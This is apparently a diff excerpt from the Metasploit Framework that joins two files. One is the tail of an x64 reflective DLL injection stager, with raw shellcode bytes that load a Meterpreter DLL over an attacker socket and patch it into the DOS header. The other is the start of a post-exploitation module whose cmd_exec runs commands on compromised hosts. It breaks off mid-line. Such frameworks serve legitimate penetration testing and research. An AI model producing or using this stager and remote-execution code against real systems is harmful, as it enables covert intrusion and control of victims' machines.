+					"\xFF\xD3" +                        # call rbx            ; call ReflectiveLoader()
+					"\x48\x89\xC3" +                    # mov rbx, rax        ; save DllMain for second call
+					"\x49\x89\xF8" +                    # mov r8, rdi         ; R8 = our socket
+					"\x68\x04\x00\x00\x00" +            # push 4              ;
+					"\x5A" +                            # pop rdx             ; RDX = signal we have attached
+					"\xFF\xD0" +                        # call rax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
+					"\x41\xB8" + exit_funk +            # mov r8d, 0x???????? ; our EXITFUNC placeholder
+					"\x68\x05\x00\x00\x00" +            # push 5              ;
+					"\x5A" +                            # pop rdx             ; signal we have detached
+					"\xFF\xD3"                          # call rbx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
+					# the DOS headers e_lfanew entry will begin here at offset 64.
+
+		# sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
+		if( bootstrap.length > 62 )
+			print_error( "Reflective Dll Injection (x64) generated an oversized bootstrap!" )
+			return
+		end
+
+		# patch the bootstrap code into the dll's DOS header...
+		dll[ 0, bootstrap.length ] = bootstrap
+
+		# return our stage to be loaded by the intermediate stager
+		return dll
+	end
+
+end
+
+end
+
+                                                                                                                                                                                                                                                                                                                                                                                                                              # -*- coding: binary -*-
+module Msf
+class Post
+
+module Common
+
+	#
+	# Executes +cmd+ on the remote system
+	#
+	# On Windows meterpreter, this will go through CreateProcess as the
+	# "commandLine" parameter. This means it will follow the same rules as
+	# Windows' path disambiguation. For example, if you were to call this method
+	# thusly:
+	#
+	#     cmd_exec("c:\\program files\\sub dir\\program name")
+	#
+	# Windows would look for these executables, in this order, passing the rest
+	# of the line as arguments:
+	#
+	#     c:\program.exe
+	#     c:\program files\sub.exe
+	#     c:\program files\sub dir\program.exe
+	#     c:\program files\sub dir\program name.exe
+	#
+	# On POSIX meterpreter, if +args+ is set or if +cmd+ contains shell
+	# metacharacters, the server will run the whole thing in /bin/sh. Otherwise,
+	# (cmd is a single path and there are no arguments), it will execve the given
+	# executable.
+	#
+	# On Java, it is passed through Runtime.getRuntime().exec(String) and PHP
+	# uses proc_open() both of which have similar semantics to POSIX.
+	#
+	# On shell sessions, this passes +cmd+ directly the session's
+	# +shell_command_token+ method.
+	#
+	# Returns a (possibly multi-line) String.
+	#
+	def cmd_exec(cmd, args=nil, time_out=15)
+		case session.
